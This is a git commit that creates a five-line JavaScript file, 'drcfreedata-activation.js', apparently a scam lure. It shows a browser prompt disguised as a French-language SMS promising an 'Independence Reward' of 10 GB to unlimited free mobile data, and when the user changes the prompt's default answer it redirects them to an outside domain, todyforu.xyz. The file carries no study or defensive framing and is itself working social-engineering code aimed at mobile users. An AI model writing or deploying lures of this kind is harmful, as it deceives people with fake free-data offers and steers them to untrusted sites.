f2dfb9d8723d2e714850457c961552701c6878f1
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-14 06:22:33 -0700

    Create drcfreedata-activation.js

---
+++ drcfreedata-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt(' SMS : cher client, veuillez vérifier si votre carte SIM est éligible pour recevoir de 10 Go à des données illimitées, Happy Independence Reward, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/drcfreedata.html';
+}
